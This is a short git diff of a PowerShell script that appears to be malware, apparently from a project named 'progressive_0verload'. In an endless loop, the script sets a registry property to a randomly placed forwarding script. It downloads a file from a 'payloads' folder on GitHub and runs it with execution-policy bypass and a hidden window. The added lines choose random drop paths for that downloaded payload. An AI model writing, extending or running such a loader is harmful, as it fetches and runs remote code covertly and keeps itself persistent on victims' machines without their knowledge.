@@ -99,6 +99,8 @@ while ($true) {
     }
     if(-not(Test-Path -Path $fwdPath -PathType Leaf)){
         if(-not($issetup)){
+            $initServicefwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+            $initServicefwdPath = "$initServicefwdPath\init_service_fwd.ps1"
             $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
             $fwdPath = "$fwdPath\$fwdName"
             Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
@@ -109,6 +111,8 @@ while ($true) {
     }
 
     elseif($x -or $y){
+        $initServicefwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+        $initServicefwdPath = "$initServicefwdPath\init_service_fwd.ps1"
         iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwd.ps1" -OutFile $initServicefwdPath
         powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath "$b" -fwdPath $fwdPath
     }
